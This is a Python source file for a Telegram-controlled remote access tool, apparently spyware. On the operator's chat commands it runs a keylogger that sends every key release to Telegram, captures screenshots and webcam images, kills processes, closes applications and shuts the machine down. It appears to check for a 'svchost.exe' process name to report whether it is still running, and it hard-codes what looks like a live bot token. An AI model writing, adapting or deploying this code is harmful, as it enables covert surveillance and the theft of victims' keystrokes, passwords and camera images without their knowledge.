import telepot
import os
import shutil
import psutil
import requests
import time
import json
import socket
import cv2
import sys
import pyautogui as p
from telepot.loop import MessageLoop
from pynput import keyboard as k
from telepot.namedtuple import ReplyKeyboardMarkup
from mss import mss
from transformers import pipeline, Conversation, AutoTokenizer
import warnings

# Constants
GREEN_CHECK = u'\U00002705'
RED_CROSS = u'\U0000274C'
BOT_ID = 737372475  # Replace with your Telegram ID
BOT_USERNAME = "teoilpiumatteo"  # Replace with your username
BOT_TOKEN = "5921040804:AAGbq7kWEkFpSi7BuaOxE0mqbaSeUNiGm6I"  # Replace with your bot token

# Utility functions
def notify_telegram_status(message):
    bot.sendMessage(BOT_ID, message)

def is_internet_connected():
    try:
        host = socket.gethostbyname("www.google.com")
        s = socket.create_connection((host, 80), 2)
        return True
    except:
        return False

def is_process_running(process_name):
    """Check if a process with the given name is running."""
    try:
        return any(process_name.lower() in proc.name().lower() for proc in psutil.process_iter())
    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
        return False

def kill_process(process_name):
    if is_process_running(process_name):
        os.system(f"taskkill /f /im {process_name}.exe")

# Bot Commands
def activate_keylogger():
    notify_telegram_status("@@@ KEYLOGGER MODE ON @@@")

    def on_key_release(key):
        bot.sendMessage(BOT_ID, f'{key}')
    
    with k.Listener(on_release=on_key_release) as listener:
        listener.join()

def take_screenshot():
    with mss() as sct:
        file_path = sct.shot(mon=-1, output='screenshot.png')
    bot.sendPhoto(BOT_ID, photo=open(file_path, 'rb'))

def capture_camera():
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    if ret:
        file_path = 'camera_capture.png'
        cv2.imwrite(file_path, frame)
        bot.sendPhoto(BOT_ID, photo=open(file_path, 'rb'))
    cap.release()

def perform_click():
    p.click()

def close_active_application():
    p.hotkey("alt", "f4")
    p.press("enter")

def shutdown_pc():
    os.system('shutdown -s -t 0')

def update_status():
    if is_process_running("svchost.exe"):
        notify_telegram_status(f"Hi, Boss! I'm ON {GREEN_CHECK}")
    else:
        notify_telegram_status(f"Sorry, someone stopped me. Shutting down... {RED_CROSS}")

# Main handler
def handle_message(msg):
    content_type, chat_type, chat_id = telepot.glance(msg)
    text = msg['text'].strip().upper()

    # Autorizzazione dell'utente
    if chat_id != BOT_ID:
        bot.sendMessage(chat_id, "You aren't my Patron. Go away!")
        notify_telegram_status(f"Unauthorized contact: {msg}")
        return

    # Dizionario comandi
    commands = {
        "KILL ALL": lambda: kill_process("Telegram"),  # Esempio, aggiungi altri processi se necessario
        "SCREENSHOT": take_screenshot,
        "CAM": capture_camera,
        "CLICK": perform_click,
        "CLOSE APP": close_active_application,
        "UPDATE": update_status,
        "KEYLOGGER": activate_keylogger,
        "SHUTDOWN": shutdown_pc,
    }

    # Gestione comandi
    if text in commands:
        commands[text]()
    elif text == "/START":
        bot.sendMessage(BOT_ID, "Welcome back, Boss", reply_markup=keyboard)
    else:
        # Se non è un comando, passalo al chatbot
        handle_chatbot_response(chat_id, text)


def handle_chatbot_response(chat_id, user_input):
    warnings.filterwarnings("ignore")
    try:
        tokenizer = AutoTokenizer.from_pretrained("microsoft/DialoGPT-medium", padding_side="left")
        generator = pipeline("conversational", model="microsoft/DialoGPT-medium")
        conversation = Conversation()
        conversation.add_user_input(user_input)
        full_conv = generator(conversation, pad_token_id=tokenizer.eos_token_id)
        response = full_conv.generated_responses[-1]

        # Controllo se la risposta è vuota
        if not response.strip():
            response = "Sorry, I could not understand your message."
        
        bot.sendMessage(chat_id, response)
    except Exception as e:
        bot.sendMessage(chat_id, f"Si è verificato un errore: {str(e)}")


# Bot Initialization
if __name__ == "__main__":
    wait_for_internet = is_internet_connected()
    bot = telepot.Bot(BOT_TOKEN)
    MessageLoop(bot, handle_message).run_as_thread()
    keyboard = ReplyKeyboardMarkup(keyboard=[['UPDATE', 'SHUTDOWN'], ['KEYLOGGER', 'SCREENSHOT'], ['CAM', 'KILL ALL']])
    notify_telegram_status("Hi Boss, I am ON now!")

    while True:
        time.sleep(1)
